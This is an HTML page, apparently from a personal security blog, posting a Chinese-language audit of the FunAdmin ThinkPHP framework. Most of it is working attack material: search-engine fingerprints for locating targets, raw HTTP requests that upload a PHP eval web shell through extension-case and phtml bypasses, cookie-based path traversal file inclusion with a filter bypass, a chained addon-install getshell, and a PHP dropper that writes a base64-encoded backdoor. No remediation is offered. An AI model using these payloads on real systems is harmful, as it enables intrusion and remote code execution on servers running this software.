@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <meta name="robots" content="index, follow">
+  <!-- title -->
+  
+    
+  <title>Funadmin审计报告 - Hello Hehanzzz~</title>
+    
+  
+  
+  <!-- open graph -->
+  <meta name="description" content="0x01 下载官网：FunAdmin - 基于ThinkPHP8和layui的全栈开发框架 指纹：  fofa：icon_hash&#x3D;&quot;-314551259&quot; hunter：web.icon&#x3D;&quot;af81d0a4bbb154e4e4a3468f28bd826f&quot;  0x02 后台文件上传Getshell适用访问：  Cms版本：任意版本 主机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Funadmin审计报告">
+<meta property="og:url" content="https://hehanzzz.github.io/2025/02/15/Funadmin%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/index.html">
+<meta property="og:site_name" content="Hello Hehanzzz~">
+<meta property="og:description" content="0x01 下载官网：FunAdmin - 基于ThinkPHP8和layui的全栈开发框架 指纹：  fofa：icon_hash&#x3D;&quot;-314551259&quot; hunter：web.icon&#x3D;&quot;af81d0a4bbb154e4e4a3468f28bd826f&quot;  0x02 后台文件上传Getshell适用访问：  Cms版本：任意版本 主机">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://oss.hehanzzz.icu/2025/02/d678c4d317932641f1141cd288cf8766.png">
+<meta property="og:image" content="https://oss.hehanzzz.icu/2025/02/b99d51545756c1ef62aa5d2d6afa10b5.png">
+<meta property="og:image" content="https://oss.hehanzzz.icu/2025/02/9782711515776665807d0ad375bdf8f5.png">
+<meta property="og:image" content="https://oss.hehanzzz.icu/2025/02/e2aa6abd678133cdf201abe458553830.png">
+<meta property="og:image" content="https://oss.hehanzzz.icu/2025/02/3a60db933915ec9fbc7917b9b92b6d12.png">
+<meta property="og:image" content="https://oss.hehanzzz.icu/2025/02/adb1c5062fdb7ab745e499da13723045.png">
+<meta property="article:published_time" content="2025-02-14T16:13:32.000Z">
+<meta property="article:modified_time" content="2025-02-14T16:18:18.499Z">
+<meta property="article:author" content="Hehanzzz">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oss.hehanzzz.icu/2025/02/d678c4d317932641f1141cd288cf8766.png">
+  <!-- canonical -->
+  
+  <link rel="canonical" href="https://hehanzzz.github.io/2025/02/15/Funadmin审计报告/">
+  
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/img/3.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
+  <!-- CSS -->
+  
+<link rel="stylesheet" href="/css/reset.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/markdown.css">
+
+  
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Hello Hehanzzz~</a>
+    <!-- <div class="logo"><a href="/" title="Len"><img src="/img/logo.svg" alt="Len" aria-label="logo" height="20"></a></div> -->
+        <ul class="nav">
+            
+            <li><a href="/">Home</a></li>
+            
+            <li><a href="/about">About</a></li>
+            
+            <li><a href="/archives">Archives</a></li>
+            
+            <li><a href="/friends">Friends</a></li>
+            
+        </ul>
+
+
+    </a>
+</div>
+
+
+                
+                <div class="post-main">
+    
+        <div class="post-main-title">
+            Funadmin审计报告
+        </div>
+        <div class="post-meta">
+            2025-02-15 ｜ 
+            
+        </div>
+        <!-- 圆角分类 -->
+        <!-- <div class="tags"> -->
+            <!--  -->
+        <!-- </div> -->
+        <div class="post-md">
+            <h1 id="0x01-下载"><a href="#0x01-下载" class="headerlink" title="0x01 下载"></a>0x01 下载</h1><p>官网：<a target="_blank" rel="noopener" href="https://www.funadmin.com/">FunAdmin - 基于ThinkPHP8和layui的全栈开发框架</a></p>
+<p>指纹：</p>
+<ul>
+<li>fofa：icon_hash&#x3D;&quot;-314551259&quot;</li>
+<li>hunter：web.icon&#x3D;&quot;af81d0a4bbb154e4e4a3468f28bd826f&quot;</li>
+</ul>
+<h1 id="0x02-后台文件上传Getshell"><a href="#0x02-后台文件上传Getshell" class="headerlink" title="0x02 后台文件上传Getshell"></a>0x02 后台文件上传Getshell</h1><p>适用访问：</p>
+<ul>
+<li>Cms版本：任意版本</li>
+<li>主机：Windows</li>
+<li>中间件：nginx、apache</li>
+</ul>
+<p><img src="https://oss.hehanzzz.icu/2025/02/d678c4d317932641f1141cd288cf8766.png" alt="image">​</p>
+<p>登录后台后选择设置—&gt;上传设置</p>
+<p>将php改为pHp</p>
+<p>使用下面数据包上传，需要注意的是下面的上传包不需要cookie也可以上传，即为前台上传</p>
+<pre><code class="highlight php">POST /backend/ajax/uploads?save=<span class="number">1</span>&amp;path=addon HTTP/<span class="number">1.1</span>
+Host: <span class="number">192.168</span>.<span class="number">100.200</span>
+Content-Length: <span class="number">198</span>
+Accept: application/json, text/javascript, *<span class="comment">/*; q=0.01</span>
+<span class="comment">X-Requested-With: XMLHttpRequest</span>
+<span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span>
+<span class="comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryU0l40M5UJ9N6allK</span>
+<span class="comment">Origin: http://192.168.124.9</span>
+<span class="comment">Accept-Encoding: gzip, deflate</span>
+<span class="comment">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="comment">Connection: close</span>
+<span class="comment"></span>
+<span class="comment">------WebKitFormBoundaryU0l40M5UJ9N6allK</span>
+<span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pHp&quot;</span>
+<span class="comment">Content-Type: application/octet-stream</span>
+<span class="comment"></span>
+<span class="comment">&lt;?php eval($_POST[1]);?&gt;</span>
+<span class="comment">------WebKitFormBoundaryU0l40M5UJ9N6allK--</span></code></pre>
+
+<p>可以得到如下的地址</p>
+<p><img src="https://oss.hehanzzz.icu/2025/02/b99d51545756c1ef62aa5d2d6afa10b5.png" alt="image">​</p>
+<p>直接拼接即可</p>
+<p>因为linux区分大小写所以无法解析这个pHp，只有windows可以解析，故只使用windows版本</p>
+<h1 id="0x03-前台文件上传Getshell"><a href="#0x03-前台文件上传Getshell" class="headerlink" title="0x03 前台文件上传Getshell"></a>0x03 前台文件上传Getshell</h1><p>适用访问：</p>
+<ul>
+<li>Cms版本：6.0以下版本</li>
+<li>主机：Windows、Linux</li>
+<li>中间件：apache</li>
+</ul>
+<p>低版本文件上传没有文件后缀的限制，可以使用前面提供的数据包上传phtml进行解析</p>
+<p>且因为apache的解析机制可以直接解析phtml</p>
+<pre><code class="highlight php">POST /backend/ajax/uploads?save=<span class="number">1</span>&amp;path=addon HTTP/<span class="number">1.1</span>
+Host: <span class="number">192.168</span>.<span class="number">100.200</span>
+Content-Length: <span class="number">198</span>
+Accept: application/json, text/javascript, *<span class="comment">/*; q=0.01</span>
+<span class="comment">X-Requested-With: XMLHttpRequest</span>
+<span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span>
+<span class="comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryU0l40M5UJ9N6allK</span>
+<span class="comment">Origin: http://192.168.124.9</span>
+<span class="comment">Accept-Encoding: gzip, deflate</span>
+<span class="comment">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="comment">Connection: close</span>
+<span class="comment"></span>
+<span class="comment">------WebKitFormBoundaryU0l40M5UJ9N6allK</span>
+<span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.phtml&quot;</span>
+<span class="comment">Content-Type: application/octet-stream</span>
+<span class="comment"></span>
+<span class="comment">&lt;?php eval($_POST[1]);?&gt;</span>
+<span class="comment">------WebKitFormBoundaryU0l40M5UJ9N6allK--</span></code></pre>
+
+<h1 id="0x04-前台文件包含"><a href="#0x04-前台文件包含" class="headerlink" title="0x04 前台文件包含"></a>0x04 前台文件包含</h1><p>适用访问：</p>
+<ul>
+<li>Cms版本：任意版本</li>
+<li>主机：Windows、Linux</li>
+<li>中间件：apache、nginx</li>
+</ul>
+<h2 id="6-0版本"><a href="#6-0版本" class="headerlink" title="6.0版本"></a>6.0版本</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre><code class="highlight php">GET /frontend/ajax/lang?controllername= HTTP/<span class="number">1.1</span>
+Host: <span class="number">192.168</span>.<span class="number">100.200</span>
+Upgrade-Insecure-Requests: <span class="number">1</span>
+User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">109.0</span>.<span class="number">5414.120</span> Safari/<span class="number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="comment">Accept-Encoding: gzip, deflate</span>
+<span class="comment">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="comment">Cookie: think_lang=..\/..\/..\/config/database; PHPSESSID=11kslsra8o1aka04sc7qlrp5q1; yzmphp_adminid=bb327ih1lHj2Rt62TgnGSmIX9B4lzjNkR7Nr6AxB; yzmphp_adminname=edfdi2GFuNVX8DYka_v1VZgFhjRQnU-xRPNTs43KyfW8CQ</span>
+<span class="comment">Connection: close</span></code></pre>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code class="highlight php">GET /frontend/ajax/lang?controllername= HTTP/<span class="number">1.1</span>
+Host: <span class="number">192.168</span>.<span class="number">100.200</span>
+Upgrade-Insecure-Requests: <span class="number">1</span>
+User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">109.0</span>.<span class="number">5414.120</span> Safari/<span class="number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="comment">Accept-Encoding: gzip, deflate</span>
+<span class="comment">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="comment">Cookie: think_lang=.\./.\./.\./config/database; PHPSESSID=11kslsra8o1aka04sc7qlrp5q1; yzmphp_adminid=bb327ih1lHj2Rt62TgnGSmIX9B4lzjNkR7Nr6AxB; yzmphp_adminname=edfdi2GFuNVX8DYka_v1VZgFhjRQnU-xRPNTs43KyfW8CQ</span>
+<span class="comment">Connection: close</span>
+<span class="comment"></span></code></pre>
+
+<h2 id="6-0版本下的"><a href="#6-0版本下的" class="headerlink" title="6.0版本下的"></a>6.0版本下的</h2><h3 id="Windows、Linux"><a href="#Windows、Linux" class="headerlink" title="Windows、Linux"></a>Windows、Linux</h3><pre><code class="highlight php">GET /frontend/ajax/lang?controllername= HTTP/<span class="number">1.1</span>
+Host: <span class="number">192.168</span>.<span class="number">100.200</span>
+Upgrade-Insecure-Requests: <span class="number">1</span>
+User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">109.0</span>.<span class="number">5414.120</span> Safari/<span class="number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="comment">Accept-Encoding: gzip, deflate</span>
+<span class="comment">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="comment">Cookie: think_lang=../../../config/database; PHPSESSID=11kslsra8o1aka04sc7qlrp5q1; yzmphp_adminid=bb327ih1lHj2Rt62TgnGSmIX9B4lzjNkR7Nr6AxB; yzmphp_adminname=edfdi2GFuNVX8DYka_v1VZgFhjRQnU-xRPNTs43KyfW8CQ</span>
+<span class="comment">Connection: close</span></code></pre>
+
+<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>这里是进行文件包含，通过改变Cookie下的 think_lang 进行文件包含</p>
+<p>例如读取根目录下的 config&#x2F;database</p>
+<p>不需要加 .php 是因为源码已经加了</p>
+<p><img src="https://oss.hehanzzz.icu/2025/02/9782711515776665807d0ad375bdf8f5.png" alt="image">​</p>
+<p>因为6.0加了限制</p>
+<pre><code class="highlight php"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$lang</span>) &amp;&amp; <span class="title class_">Str</span>::<span class="title function_ invoke__">contains</span>(<span class="variable">$lang</span>,<span class="string">&#x27;../&#x27;</span>))&#123;
+	<span class="keyword">return</span> <span class="literal">false</span>;
+&#125;</code></pre>
+
+<p>所以得用上面的bypass</p>
+<h1 id="0x04-后台组合拳Getshell"><a href="#0x04-后台组合拳Getshell" class="headerlink" title="0x04 后台组合拳Getshell"></a>0x04 后台组合拳Getshell</h1><p>适用访问：</p>
+<ul>
+<li>Cms版本：任意版本</li>
+<li>主机：Windows、Linux</li>
+<li>中间件：apache、nginx</li>
+</ul>
+<ol>
+<li><p>文件上传</p>
+<p>这里上传一个zip压缩包，压缩包里面是shell.php，得到返回地址</p>
+<pre><code class="highlight php">POST /backend/ajax/uploads?save=<span class="number">1</span>&amp;path=addon HTTP/<span class="number">1.1</span>
+Host: <span class="number">192.168</span>.<span class="number">124.9</span>
+Content-Length: <span class="number">427</span>
+Accept: application/json, text/javascript, *<span class="comment">/*; q=0.01</span>
+<span class="comment">X-Requested-With: XMLHttpRequest</span>
+<span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span>
+<span class="comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiPElv4sXLfA98mXx</span>
+<span class="comment">Origin: http://192.168.124.9</span>
+<span class="comment">Accept-Encoding: gzip, deflate</span>
+<span class="comment">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="comment">Connection: close</span>
+<span class="comment"></span>
+<span class="comment">------WebKitFormBoundaryiPElv4sXLfA98mXx</span>
+<span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;phpinfo.zip&quot;</span>
+<span class="comment">Content-Type: application/x-zip-compressed</span>
+<span class="comment"></span>
+<span class="comment">PK</span>
+<span class="comment">------WebKitFormBoundaryiPElv4sXLfA98mXx--</span></code></pre>
+</li>
+<li><p>将返回包中的地址与下面数据包中的url参数进行拼接，需要注意的是这一步是需要管理员 PHPSESSID 的</p>
+<pre><code class="highlight php">POST /backend/addon/localinstall HTTP/<span class="number">1.1</span>
+Host: <span class="number">127.0</span>.<span class="number">0.1</span>
+Content-Length: <span class="number">72</span>
+Accept: application/json, text/javascript, *<span class="comment">/*; q=0.01</span>
+<span class="comment">X-Requested-With: XMLHttpRequest</span>
+<span class="comment">X-CSRF-TOKEN: 1418f796892bfd0604986304635234b8</span>
+<span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span>
+<span class="comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="comment">Origin: http://192.168.124.9</span>
+<span class="comment">Accept-Encoding: gzip, deflate</span>
+<span class="comment">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="comment">Cookie: admin_lang=cn; home_lang=cn; ENV_UPHTML_AFTER=%7B%22seo_uphtml_after_home%22%3A0%2C%22seo_uphtml_after_channel%22%3A0%2C%22seo_uphtml_after_pernext%22%3A%221%22%7D; admin-arctreeClicked-Arr=%5B%5D; ENV_GOBACK_URL=%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; ENV_LIST_URL=%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; ENV_IS_UPHTML=0; think_lang=zh-cn; PHPSESSID=de2c6b55731a29285b307b01b96cfaa6</span>
+<span class="comment">Connection: close</span>
+<span class="comment"></span>
+<span class="comment">url=%2Fstorage%2Faddon%2F20240710%2F14fefd4256bd837c01476a64ccdafda8.zip</span></code></pre>
+
+<p><img src="https://oss.hehanzzz.icu/2025/02/e2aa6abd678133cdf201abe458553830.png" alt="image">​</p>
+<p>又源码得知插件解压目录为根目录下的 addons</p>
+<p><img src="https://oss.hehanzzz.icu/2025/02/3a60db933915ec9fbc7917b9b92b6d12.png" alt="image">​</p>
+</li>
+<li><p>使用上面的文件包含进行包含</p>
+<pre><code class="highlight php">POST /frontend/ajax/lang?controllername= HTTP/<span class="number">1.1</span>
+Host: <span class="number">127.0</span>.<span class="number">0.1</span>
+sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;109&quot;</span>, <span class="string">&quot;Not_A Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>
+sec-ch-ua-mobile: ?<span class="number">0</span>
+sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span>
+Upgrade-Insecure-Requests: <span class="number">1</span>
+User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">109.0</span>.<span class="number">5414.120</span> Safari/<span class="number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="comment">Sec-Fetch-Site: none</span>
+<span class="comment">Sec-Fetch-Mode: navigate</span>
+<span class="comment">Sec-Fetch-User: ?1</span>
+<span class="comment">Sec-Fetch-Dest: document</span>
+<span class="comment">Accept-Encoding: gzip, deflate</span>
+<span class="comment">Accept-Language: zh-CN,zh;q=0.9</span>
+<span class="comment">Cookie: think_lang=..\\..\\..\\addons\yijuhua; PHPSESSID=11kslsra8o1aka04sc7qlrp5q1; yzmphp_adminid=bb327ih1lHj2Rt62TgnGSmIX9B4lzjNkR7Nr6AxB; yzmphp_adminname=edfdi2GFuNVX8DYka_v1VZgFhjRQnU-xRPNTs43KyfW8CQ</span>
+<span class="comment">Connection: close</span>
+<span class="comment">Content-Type: application/x-www-form-urlencoded</span>
+<span class="comment">Content-Length: 5</span>
+<span class="comment"></span>
+<span class="comment">1=dir</span></code></pre>
+
+<p><img src="https://oss.hehanzzz.icu/2025/02/adb1c5062fdb7ab745e499da13723045.png" alt="image">​</p>
+</li>
+</ol>
+<p>自次成功Getshell</p>
+<p>这里存在一个问题</p>
+<p>如果文件包含使用蚁剑连接不上去的时候</p>
+<p>可以使用下面代码，使用file_put_contents进行重新写文件</p>
+<p>但是因为不知道为什么输出文件的时候</p>
+<p>$_POST会被过滤掉?</p>
+<p>所以只能使用下面的方法</p>
+<p>eval(eval($_POST[1]))</p>
+<p>但是eval($_POST[1])需要被base64加密</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;2&#x27;</span>];
+<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="number">1</span>) &#123;
+    <span class="keyword">echo</span> <span class="string">&quot;success | &quot;</span>;
+    <span class="variable">$encodedCode</span> = <span class="string">&#x27;ZXZhbCgkX1BPU1RbMV0pOw==&#x27;</span>;
+    <span class="variable">$code</span> = <span class="string">&#x27;file_put_contents(&quot;404.php&quot;, &quot;&lt;?php eval(base64_decode(\&#x27;&#x27;</span> . <span class="variable">$encodedCode</span> . <span class="string">&#x27;\&#x27;)); ?&gt;&quot;);&#x27;</span>;
+    <span class="keyword">eval</span>(<span class="variable">$code</span>);
+&#125;
+<span class="meta">?&gt;</span>
+</code></pre>
+
+<p>输出的文件自然就在public下了</p>
+
+        </div>
+    
+<!-- tags -->
+
+    <div class="post-meta">
+        标签：
+        
+            <a href="/tags/PHP/"> / PHP</a>
+        
+    </div>
+
+</div>
+                <div class="footer">
+    <span>Copyright © <script>document.write(new Date().getFullYear())</script> Hello Hehanzzz~</span>
+    <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> with <a target="_blank" rel="noopener" href="https:///imzl.com/zenmind">ZenMind</a></span>
+</div>
+
+<link rel="stylesheet" href="/css/theme.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+<script>
+    hljs.initHighlightingOnLoad();
+    // hljs.initLineNumbersOnLoad();
+    highlightAll();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
